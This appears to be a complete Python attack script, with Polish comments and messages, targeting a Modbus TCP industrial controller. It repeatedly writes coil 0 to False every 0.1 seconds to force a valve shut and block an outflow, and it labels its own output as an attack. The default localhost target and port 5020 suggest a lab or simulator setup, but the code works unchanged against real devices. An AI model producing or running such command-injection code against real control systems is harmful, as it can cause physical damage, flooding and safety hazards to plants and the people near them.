import sys
import time
from pymodbus.client import ModbusTcpClient

target = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
port = 5020

print(f"[ATTACK] Rozpoczynam ciagly wstrzyk rozkazu ZAMKNIJ ZAWOR (Coil 0 -> False) na {target}:{port}")
client = ModbusTcpClient(target, port=port)

if not client.connect():
    print(f"[ERROR] Brak polaczenia z celem {target}:{port}!")
    exit(1)

try:
    counter = 0
    while True:
        # Bezwzgledne wymuszanie zamkniecia odplywu
        client.write_coil(address=0, value=False)
        counter += 1
        if counter % 10 == 0:
            print(f"[ATTACK] Wstrzyknięto {counter} pakietow paraliżujących odpływ...")
        time.sleep(0.1)
except KeyboardInterrupt:
    print("\n[ATTACK] Przerwano atak.")
finally:
    client.close()
